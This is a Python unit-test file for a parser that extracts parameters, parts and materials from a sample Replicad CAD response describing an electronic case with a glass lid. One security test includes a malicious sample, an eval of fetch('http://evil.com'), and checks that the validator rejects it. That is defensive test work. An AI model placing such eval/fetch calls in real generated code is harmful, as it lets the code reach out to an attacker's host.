"""Unit tests for ReplicadParser."""

import pytest
from src.api.schemas import MaterialType
from src.domain.exceptions import SecurityViolationException
from src.domain.parser import ReplicadParser

SAMPLE_REPLICAD_RESPONSE = """Here is your parametric electronic case with a glass inspection lid:

```typescript
import { drawRoundedRectangle, makeCylinder, sketchOnPlane } from "replicad";

export const defaultParams = {
  length: 120, // Length in mm
  width: 80,
  wallThickness: 2.5,
  glassThickness: 3.0,
  hasFasteners: true,
};

export type ModelParams = typeof defaultParams;

export default function main(params: ModelParams = defaultParams) {
  const { length, width, wallThickness, glassThickness } = params;
  const box = drawRoundedRectangle(length, width, 4).sketchOnPlane("XY").extrude(30);
  const glassLid = drawRoundedRectangle(length - 0.5, width - 0.5, 4).sketchOnPlane("XY").extrude(glassThickness);

  return [
    {
      name: "Chassis",
      shape: box,
      color: "#1e293b",
      material: "plastic",
      roughness: 0.5,
      metalness: 0.0,
      opacity: 1.0,
      transparent: false,
    },
    {
      name: "GlassInspectionWindow",
      shape: glassLid,
      color: "#93c5fd",
      material: "glass",
      roughness: 0.05,
      metalness: 0.0,
      transmission: 0.95,
      opacity: 0.35,
      ior: 1.52,
      transparent: true,
    }
  ];
}
```

Design Notes:
The glass lid has a 0.25mm clearance per side to ensure a smooth drop-in fit.
"""


def test_extract_code_and_explanation():
    code, explanation = ReplicadParser.extract_code_and_explanation(SAMPLE_REPLICAD_RESPONSE)
    assert "import { drawRoundedRectangle" in code
    assert "export default function main" in code
    assert explanation is not None
    assert "parametric electronic case" in explanation
    assert "Design Notes" in explanation


def test_extract_parameters():
    code, _ = ReplicadParser.extract_code_and_explanation(SAMPLE_REPLICAD_RESPONSE)
    params, param_defs = ReplicadParser.extract_parameters(code)

    assert params["length"] == 120
    assert params["width"] == 80
    assert params["wallThickness"] == 2.5
    assert params["glassThickness"] == 3.0
    assert params["hasFasteners"] is True

    # Validate generated bounds for length
    length_def = next(d for d in param_defs if d.name == "length")
    assert length_def.min_value is not None and length_def.min_value <= 120
    assert length_def.max_value is not None and length_def.max_value >= 120


def test_extract_parts_and_materials():
    code, _ = ReplicadParser.extract_code_and_explanation(SAMPLE_REPLICAD_RESPONSE)
    parts, materials, has_glass = ReplicadParser.extract_parts_and_materials(code)

    assert len(parts) == 2
    assert has_glass is True
    assert "glass" in materials
    assert "plastic" in materials

    chassis = parts[0]
    assert chassis.name == "Chassis"
    assert chassis.color == "#1e293b"
    assert chassis.material == MaterialType.PLASTIC
    assert chassis.opacity == 1.0

    glass_part = parts[1]
    assert glass_part.name == "GlassInspectionWindow"
    assert glass_part.color == "#93c5fd"
    assert glass_part.material == MaterialType.GLASS
    assert glass_part.opacity == 0.35
    assert glass_part.transmission == 0.95
    assert glass_part.ior == 1.52
    assert glass_part.transparent is True


def test_security_violation_detection():
    malicious_code = """
    export default function main() {
        eval("fetch('http://evil.com')");
        return [];
    }
    """
    with pytest.raises(SecurityViolationException):
        ReplicadParser.validate_security(malicious_code)


def test_conversational_response_returns_empty_code():
    code, explanation = ReplicadParser.extract_code_and_explanation("Sorry, I cannot generate a CAD model for that.")
    assert code == ""
    assert explanation is not None
    assert "Sorry" in explanation
